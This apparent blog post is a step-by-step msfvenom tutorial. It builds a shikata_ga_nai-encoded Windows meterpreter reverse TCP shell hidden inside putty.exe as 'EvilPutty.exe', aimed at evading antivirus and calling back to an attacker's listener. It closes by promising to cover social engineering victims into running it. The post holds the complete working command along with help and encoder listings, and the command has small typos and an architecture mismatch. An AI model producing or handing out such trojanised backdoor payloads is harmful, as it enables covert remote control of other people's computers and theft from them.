---
layout: post
title:  "msfvenom walkthrough"
---
![alt text](http://www.interpretermag.com/wp-content/uploads/2014/03/hacker-grenade.jpg "Logo Title Text 1")

## How to create a payload with MSF Venom
Hello 1337 newbs. Today we will go over how to create and obfuscate a reverse TCP shell through MSF Venom. I will be using Kali 2.0 to complete this so feel free to follow along.

To launch a successful attack you will need to be able to bypass anti-virus software or other host-based protection for successful exploitation. The most effective way to avoid anti-virus detection on your target’s computers is to create your own customized back-door. We can leverage the built in ability to obfuscate payloads within commonly used files. In this example I will use putty.exe to supply the payload and we will use MSF Venom's encoder to hide the payload from Anti-virus.

#### Disclaimer - This method will probably not bypass an up to date anti-virus

### MSF Venom
msfvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. Note: msfvenom has replaced both msfpayload and msfencode as of June 8th, 2015.


```
$ msfvenom --help
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>

Options:
    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
    -f, --format        <format>     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       <encoder>    The encoder to use
    -a, --arch          <arch>       The architecture to use
        --platform      <platform>   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         <length>     The maximum size of the resulting payload
        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    <count>      The number of times to encode the payload
    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
    -x, --template      <path>       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           <path>       Save the payload
    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```
    
Lets take a look at some useful options
    
* -p designates the Metasploit payload we want to use
* -e designates the encoder we want to use
* -a designates the architecture we want to use (default is x86)
* -s designates the maximum size of the payload
* -i designates the number of iterations with which to encode the payload
* -x designates a custom executable file to use as a template ```

## Encoders
Encoders are the various algorithms and encoding schemes that Metasploit can use to re-encode the payloads.
We can looks at these by typing

```
$ msfvemon -l encoders
Framework Encoders
==================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```
We will use x86\shikate_ga_nai in our example

## Building the Payload

I will start with our completed command and we then we will analyze each option in more detail.

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 -b '\x00'-a x64 LHOST=10.1.10.2 LPORT=443 -x ~/Windows/Programs/putty.exe -f exe > ~/payloads/windows/EvilPutty.exe
```
* -p windows/meterpreter/reverse_tcp
  * Payload to use. A list can be found by using the command ```msfconsole``` and then entering ```show payloads``` at the msfconsole prompt.
* -e x86/shikata_ga_nai
  * Encoder - This is the algorithm that is used to encode your shell code in attempts to bypass anti-vurs. shikata_ga_nai is a polymorphic shell code encoder. More can be read about it on the web.
* -i 20
  * Iterations - this is the number of time your payload will be encoded.
* -b 
  * Bad Characters - A bad character is simply a list of unwanted characters that can break the shell codes. Depending on the application and the developer logic there is a different set of bad characters for every program that we would encounter. Some common ones include
    * 00 for NULL
    * OA for Line Feed \n
    * OD for Carriage Return \r
    * FF for Form Feed \f
* -a x86
  * This is the architecture of the program we are hiding our payload in.
* LHOST=
  * Listening Host - This will be the IP that we want our reverse TCP shell to call back too.
* LPORT=
  * Listening Port - This will be the port our host is listening on.
* -x ~/windows/Programs/putty.exe
  * Template - This is the path to the program we want to use as a template.
* -f 
  * Format - This is the output format we want.
* \> ~/payloads/windows/EvilPutty.exe
  * This is the output file.
 
# Wrapping it up
Although this method might not work every time, there is a very good possibility that the victim might not have anti-virus installed or turned on their machine. The next step would be coming up with a way to get someone to run this payload. There are many ways to do this. Next time we will cover some ways to social engineer someone to run this payload on their machine for you.
